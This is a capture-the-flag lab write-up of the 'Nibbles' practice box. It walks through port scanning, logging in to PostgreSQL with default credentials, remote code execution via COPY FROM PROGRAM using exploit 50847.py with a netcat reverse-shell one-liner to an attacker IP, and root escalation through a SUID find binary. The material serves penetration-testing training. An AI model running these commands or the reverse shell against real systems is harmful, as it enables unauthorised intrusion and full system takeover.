# "Nibbles" (Intermediate)



Date: 08/30/22

Walkthrough by: Jacob Swinsinski

“Nibbles” from Offensive Security’s Proving Ground Practice — “Intermediate” Difficulty

Target: 192.168.78.47

#### Recon:

```
nmapAutomator.sh -H 192.168.78.47 -t All                          Tue 30 Aug 2022 09:02:33 PM EDT

Running all scans on 192.168.78.47

Host is likely running Linux

---------------------Starting Port Scan-----------------------

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

---------------------Starting Script Scan-----------------------

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

---------------------Starting Full Scan------------------------

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
5437/tcp open  pmip6-data

Making a script scan on extra ports: 5437

PORT     STATE SERVICE    VERSION
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.7
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47

No UDP ports are open

---------------------Starting Vulns Scan-----------------------
                                                                                                                    
Running CVE scan on all ports
                                                                                                                    

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     <https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19>        *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     <https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97>        *EXPLOIT*
|       EDB-ID:46516    5.8     <https://vulners.com/exploitdb/EDB-ID:46516>      *EXPLOIT*
|       EDB-ID:46193    5.8     <https://vulners.com/exploitdb/EDB-ID:46193>      *EXPLOIT*
|       1337DAY-ID-32328        5.8     <https://vulners.com/zdt/1337DAY-ID-32328>        *EXPLOIT*
|       1337DAY-ID-32009        5.8     <https://vulners.com/zdt/1337DAY-ID-32009>        *EXPLOIT*
|_      PACKETSTORM:151227      0.0     <https://vulners.com/packetstorm/PACKETSTORM:151227>      *EXPLOIT*
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2022-31813  7.5     <https://vulners.com/cve/CVE-2022-31813>
|       CVE-2022-23943  7.5     <https://vulners.com/cve/CVE-2022-23943>
|       CVE-2022-22720  7.5     <https://vulners.com/cve/CVE-2022-22720>
|       CVE-2021-44790  7.5     <https://vulners.com/cve/CVE-2021-44790>
|       CVE-2021-39275  7.5     <https://vulners.com/cve/CVE-2021-39275>
|       CVE-2021-26691  7.5     <https://vulners.com/cve/CVE-2021-26691>
|       CVE-2020-11984  7.5     <https://vulners.com/cve/CVE-2020-11984>
|       1337DAY-ID-34882        7.5     <https://vulners.com/zdt/1337DAY-ID-34882>        *EXPLOIT*
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     <https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB>        *EXPLOIT*
|       EDB-ID:46676    7.2     <https://vulners.com/exploitdb/EDB-ID:46676>      *EXPLOIT*
|       CVE-2019-0211   7.2     <https://vulners.com/cve/CVE-2019-0211>
|       1337DAY-ID-32502        7.2     <https://vulners.com/zdt/1337DAY-ID-32502>        *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     <https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8>      *EXPLOIT*
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     <https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2>      *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     <https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332>      *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     <https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B>      *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     <https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE>      *EXPLOIT*
|       1337DAY-ID-33577        5.8     <https://vulners.com/zdt/1337DAY-ID-33577>        *EXPLOIT*
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     <https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D>      *EXPLOIT*
|       1337DAY-ID-35422        4.3     <https://vulners.com/zdt/1337DAY-ID-35422>        *EXPLOIT*
|       1337DAY-ID-33575        4.3     <https://vulners.com/zdt/1337DAY-ID-33575>        *EXPLOIT*
|_      PACKETSTORM:152441      0.0     <https://vulners.com/packetstorm/PACKETSTORM:152441>      *EXPLOIT*
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.7
| vulners: 
|   cpe:/a:postgresql:postgresql:11: 
|       POSTGRESQL:CVE-2019-10164       9.0     <https://vulners.com/postgresql/POSTGRESQL:CVE-2019-10164>
|       PACKETSTORM:166540      9.0     <https://vulners.com/packetstorm/PACKETSTORM:166540>      *EXPLOIT*
|       PACKETSTORM:152757      9.0     <https://vulners.com/packetstorm/PACKETSTORM:152757>      *EXPLOIT*
|       CVE-2019-9193   9.0     <https://vulners.com/cve/CVE-2019-9193>
|       CVE-2019-10164  9.0     <https://vulners.com/cve/CVE-2019-10164>
|       76C6A4D7-16FA-5412-9C96-0363787A367C    9.0     <https://vulners.com/githubexploit/76C6A4D7-16FA-5412-9C96-0363787A367C>      *EXPLOIT*
|       27E2A12D-2B65-5A8F-B6B0-6C9A17AB25B8    9.0     <https://vulners.com/githubexploit/27E2A12D-2B65-5A8F-B6B0-6C9A17AB25B8>      *EXPLOIT*
|       1337DAY-ID-32662        9.0     <https://vulners.com/zdt/1337DAY-ID-32662>        *EXPLOIT*
|       POSTGRESQL:CVE-2020-25696       7.6     <https://vulners.com/postgresql/POSTGRESQL:CVE-2020-25696>
|       CVE-2020-25696  7.6     <https://vulners.com/cve/CVE-2020-25696>
|       POSTGRESQL:CVE-2019-10211       7.5     <https://vulners.com/postgresql/POSTGRESQL:CVE-2019-10211>
|       POSTGRESQL:CVE-2018-16850       7.5     <https://vulners.com/postgresql/POSTGRESQL:CVE-2018-16850>
|       CVE-2018-16850  7.5     <https://vulners.com/cve/CVE-2018-16850>
|_      POSTGRESQL:CVE-2019-3466        7.2     <https://vulners.com/postgresql/POSTGRESQL:CVE-2019-3466>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Visual Inspection of web server (port 80):

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3aab2327-7f53-40c0-9880-25db5de6ab5b/Untitled.png)

* Strange image when clicking on the Internet cats link:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81b82a84-5fea-4527-a715-2ec4dff440ea/Untitled.png)

#### Wappalyzer Enumeration:

* Apache 2.4.38
* Debian

#### Exploit Research:

1. Postgresql

```
searchsploit postgresql                                             Tue 30 Aug 2022 09:17:23 PM EDT
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
PostgreSQL - 'bitsubstr' Buffer Overflow                                          | linux/dos/33571.txt
PostgreSQL 6.3.2/6.5.3 - Cleartext Passwords                                      | immunix/local/19875.txt
PostgreSQL 7.x - Multiple Vulnerabilities                                         | linux/dos/25076.c
PostgreSQL 8.01 - Remote Reboot (Denial of Service)                               | multiple/dos/946.c
PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                | linux/local/7855.txt
PostgreSQL 8.3.6 - Conversion Encoding Remote Denial of Service                   | linux/dos/32849.txt
PostgreSQL 8.3.6 - Low Cost Function Information Disclosure                       | multiple/local/32847.txt
PostgreSQL 8.4.1 - JOIN Hashtable Size Integer Overflow Denial of Service         | multiple/dos/33729.txt
PostgreSQL 9.3 - COPY FROM PROGRAM Command Execution (Metasploit)                 | multiple/remote/46813.rb
PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)                 | multiple/remote/50847.py
PostgreSQL 9.4-0.5.3 - Privilege Escalation                                       | linux/local/45184.sh
```

* PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated) multiple/remote/50847.py — This will be prioritized as it is within the version and grants RCE
* However, it is authenticated so we may need credentials.
* /usr/share/exploitdb/exploits/multiple/remote/50847.py

#### PostGreSQL RCE Exploit ([50847.py](http://50847.py)):

Usage

```
python3 50847.py -i 192.168.78.47 -p 5437          Tue 30 Aug 2022 09:39:12 PM EDT

[+] Connecting to PostgreSQL Database on 192.168.78.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Add the argument -c [COMMAND] to execute a system command
```

* This means that we need to try to put a reverse shell in there for -c!

Attempt:

```
python3 50847.py -i 192.168.78.47 -p 5437 -c 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.78 80 >/tmp/f'

[+] Connecting to PostgreSQL Database on 192.168.78.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _5dcd0eee46ce6ff4816cf940fc9f7d02
[-] Command failed : ERROR:  program "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.78 80 >/tmp/f" failed
DETAIL:  child process exited with exit code 1

[+] Deleting table _5dcd0eee46ce6ff4816cf940fc9f7d02
```

* Unfortunately, this clearly did not work.

```
'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.78 80 >/tmp/f'

postgres=# COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.143 80 >/tmp/f';COPY 0
```

#### Back to the Basics:

* I Googled PostGreSQL default credentials and remembered the psql binary that we can use to connect to a psql server.
* I then attempted default credentials

```
psql -h 192.168.78.47 -p 5437 -U 'postgres'
Password for user postgres: 
psql (14.4 (Debian 14.4-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

* We can see that we succeeded!
* That then reminds me that we can go back and utilize the exploit with the -c command now that we have credentials!

#### Exploitation:

Netcat Listener:

```
nc -lnvp 80
```

[50847.py](http://50847.py)

```
python3 50847.py -i 192.168.78.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.78 80 >/tmp/f'
```

We catch a shell! — Proof!

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8472fd22-6671-4e53-a434-1b4f111cad1e/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c53a7438-7aa8-40fd-943d-94572e296463/Untitled.png)

#### Privilege Escalation:

Upgrade to a more stable shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

SUID Binaries:

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;

< -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 34896 Jan  7  2019 /usr/bin/fusermount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
```

* I remember from a previous box I had done, that find can be exploited in various ways to escalate your privileges.
* “It can be used to break out from restricted environments by spawning an interactive system shell.”

#### Exploit and Proof:

```
find . -exec /bin/sh \\; -quit

id 
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0a3629f7-a339-4f3c-b97b-40351cbb3434/Untitled.png)

Reference:

[find | GTFOBins](https://gtfobins.github.io/gtfobins/find/)

#### Lessons Learned:

1. Even though the command may say that it requires authentication but still grants RCE, still try to run it against the system regardless.
2. GOOGLE DEFAULT CREDENTIALS AND USE THEM AGAINST THE SYSTEM — BASIC BUT HIGHLY EFFECTIVE.
3. Do manual enumeration first! Then move to an automated solution as a last effort!
